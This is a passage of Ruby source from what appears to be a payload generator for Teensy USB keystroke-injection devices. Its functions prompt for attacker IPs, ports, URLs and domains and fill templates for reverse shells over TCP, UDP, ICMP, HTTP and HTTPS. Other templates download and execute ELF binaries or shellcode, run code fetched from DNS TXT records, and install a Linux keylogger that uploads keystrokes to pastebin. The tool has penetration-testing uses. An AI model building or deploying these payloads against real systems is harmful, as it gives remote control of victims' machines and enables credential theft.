  port  = input("Enter the TCP port on which the target will connect back: ")
  search_replace("./lib/src/reverse_tcp.ino","#$output_path/output/reverse_tcp.ino", ipaddr,port)
end

def reverse_udp
  puts"\nThis payload connects back to the attacker's machine on the given IP address and UDP port.".bold
  puts"\nA listener must be started on the attacker's machine on the given UDP port.".bold
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
  ipaddr = input("Enter the IP address to which the target will connect back: ")
  port  = input("Enter the UDP port on which the target will connect back: ")
  search_replace("./lib/src/reverse_udp.ino","#$output_path/output/reverse_udp.ino", ipaddr,port)
end

def reverse_icmp
  puts"\nThis payload connects back to the attacker's machine on the given IP address using ICMPv4 protocol.".bold
  puts"\nA ICMP listerner server is to be used with this paylod. is icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh)"
  puts"\nUse icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh)"
  puts"\nRun this command on the listener Linux before running the server 'sysctl -w net.ipv4.icmp_echo_ignore_all=1'"
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
  ipaddr = input("Enter the IP address to which the target will connect back: ")
  buffersize = input("Enter the BufferSize (Hit enter for default 128): ")
  delay = input("Enter the delay in seconds for which the payload waits before checking for next command (Hit enter for default 5): ")
  if (buffersize == "")
    buffersize = "128"
  end
  if (delay == "")
    delay = "5"
  end
  search_replace("./lib/src/reverse_icmp.ino","#$output_path/output/reverse_icmp.ino", ipaddr,buffersize,delay)
end

def reverse_https
  puts"\nThis payload connects back to the attacker's machine on the given IP address using valid HTTPS connection.".bold
  puts"\nThe listener to be used with this machine, Invoke-PoshRatHttps.ps1 could be found in the extras directory."
  puts"\nThe listener, which is a PowerShell script must be run from an elevated shell on attacker's Windows machine."
  puts"\nThe target makes an initial connection over HTTP to establish a valid HTTPS connection later on."
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
  ipaddr = input("Enter the IP address to which the target will connect back: ")
  port = input("Enter the HTTPS port to which the target will make the connection: ")
  search_replace("./lib/src/reverse_https.ino","#$output_path/output/reverse_https.ino", ipaddr,port)
end

def reverse_http
  puts"\nThis payload connects back to the attacker's machine on the given IP address using HTTP connection.".bold
  puts"\nThe listener to be used with this machine, Invoke-PoshRatHttp.ps1 could be found in the extras directory."
  puts"\nThe listener, which is a PowerShell script must be run from an elevated shell on attacker's Windows machine."
  puts"\nSee this blog post for detailed usage: http://www.labofapenetrationtester.com/2016/01/kautilya-easy-reverse-shells.html"
  ipaddr = input("Enter the IP address to which the target will connect back: ")
  port = input("Enter the HTTP port to which the target will make the initial connection (Hit Enter for default port 80): ")
  if (port == "")
    port = "80"
  end
  search_replace("./lib/src/reverse_http.ino","#$output_path/output/reverse_http.ino", ipaddr,port)
end

######################### Linux payloads start here ###########################
def linux_download_execute
  puts"\nThis payload downloads an elf in text format, changes it back to elf using xxd and executes it.".bold
  puts"You must manually convert and upload an elf to text.".bold
  puts"The payload needs to be generated using the command in linux_payloadgen.txt in extras directory.".bold
  url = input("Enter the URL where your elf is pasted (if using pastebin use raw url  http://pastebin.com/raw.php?i=NfiBdUp9): ")
  search_replace("./lib/src/linux_download_exec.ino","#$output_path/output/linux_download_exec.ino",url)
end

def linux_builtin_reverse_shells
  puts"\nThis payload uses builtin tools in Linux to do two separate reverse connects to your machine".bold
  ip1 = input("Enter the IP address of the machine where a listener one is running: ")
  port1 = input("Enter the port number on which the listener one is listening (use port > 1024): ")
  ip2 = input("Enter the IP address of the machine where a listener one is running: ")
  port2 = input("Enter the port number on which the listener is listening (use port > 1024): ")
  search_replace("./lib/src/linux_builtin_reverse_shells.ino","#$output_path/output/linux_builtin_reverse_shells.ino",ip1, port1,ip2,port2)
end

def linux_keylogger()
  puts"\nThis payload logs the keys of a Linux system and uploads then to pastebin.".bold
  puts"A separate powershell script found in ../extras/parsekeys.rb must be used to change logs to meaningful words.".bold
  puts"You must register an account with pastebin to post a private paste.".bold
  username = input("Enter username for the pastebin account where keys will be uploaded: ")
  password = input_pass("Enter passowrd for the pastebin account where keys will be uploaded: ")
  devkey = input("Enter api dev key (available after registration with pastebin) for the pastebin account where keys will be uploaded: ")
  search_replace("./lib/src/linux_keylogger.ino","#$output_path/output/linux_keylogger.ino",username,password,devkey)
end

def linux_codeexec()

  puts"\nThis payload executes shellcode using xxd.".bold
  puts"Currently, to use this payload you need to copy payload to linux_codeexec.txt in src directory."
  puts"The payload needs to be generated using the command in linux_payloadgen.txt in extras directory."

  file = File.read("./lib/src/linux_codeexec.ino")
  input=""
  filein = "./lib/src/linux_codeexec.txt"
  fileout = "#$output_path/output/linux_codeexec.ino"
  i=0
  File.foreach(filein) do |line|
  line = line.gsub(/\n/,"")
  if i==0
    input = file.gsub(/INPUT0/,line)
  else
    input = input.gsub(/INPUT#{i}/,line)
  end
  i+=1
  end
  File.new(fileout,"w")
  File.open(fileout,"w") {|f| f.print input}

  #File.open("#$output_path/output/linux_codeexec.ino","w") {|f| f.puts input}
  puts"\nNow copy the generated #{fileout} to your Teensy device.".cyan.bold
  puts"\nPress return to return to Main Menu.".yellow.bold
  gets
end

def linux_dns_txt_codeexec()
  puts"\nThis payload downloads code from a DNS TXT record and executes it.".bold
  puts"\nThe TXT record must be Base64 encoded. A good example could be using a perl one liner, base64 encoded."
  domain = input("Enter the domain whose TXT record will serve shellcode/command : ")
  search_replace("./lib/src/linux_dns_txt_codeexec.ino","#$output_path/output/linux_dns_txt_codeexec.ino",domain)
end

def linux_perl_reverse_shell()
  puts"\nThis payload executes perl reverse payload from msf.".bold
  puts"\nPerl comes installed by default in Ubuntu."
  ip = input("Enter the IP address of the machine where the listener is running: ")
  port = input("Enter the port number on which the listener is listening (use port > 1024): ")
  search_replace("./lib/src/linux_perl_reverse_shell.ino","#$output_path/output/linux_perl_reverse_shell.ino",ip, port)

end

######################### OS X payloads start here ###########################

def osx_download_execute()
  puts"\nThis payload downloads a shellcode in text format, changes it back to elf using xxd and executes it.".bold
  puts"You must manually convert and upload a shellcode to text.".bold
  puts"The payload needs to be generated using the commands in osx_payloadgen.txt in extras directory.".bold
  url = input("Enter the URL where the shellcode is pasted (if using pastebin use raw url e.g. http://pastebin.com/raw.php?i=NfiBdUp9): ")
  search_replace("./lib/src/osx_download_exec.ino","#$output_path/output/osx_download_exec.ino",url)

end

def osx_dns_txt_codeexec()
  puts"\nThis payload downloads code from a DNS TXT record and executes it using xxd.".bold
  puts"\nThe TXT record must be Base64 encoded. A good example could be using a perl one liner, base64 encoded."
  domain = input("Enter the domain whose TXT record will serve shellcode/command : ")
  search_replace("./lib/src/osx_dns_txt_codeexec.ino","#$output_path/output/osx_dns_txt_codeexec.ino",domain)
end

def osx_perl_reverse_shell()
  puts"\nThis payload executes perl reverse payload from msf.".bold
  puts"\nPerl comes installed by default in OS X Lion."
  ip = input("Enter the IP address of the machine where the listener is running: ")
  port = input("Enter the port number on which the listener is listening (use port > 1024): ")
  search_replace("./lib/src/osx_perl_reverse_shell.ino","#$output_path/output/osx_perl_reverse_shell.ino",ip, port)

end

def osx_ruby_reverse_shell()
  puts"\nThis payload executes ruby reverse payload from msf.".bold
  puts"\nRuby comes installed by default in OS X Lion."
  ip = input("Enter the IP address of the machine where the listener is running: ")
  port = input("Enter the port number on which the listener is listening (use port > 1024): ")
  search_replace("./lib/src/osx_ruby_reverse_shell.ino","#$output_path/output/osx_ruby_reverse_shell.ino",ip, port)
end
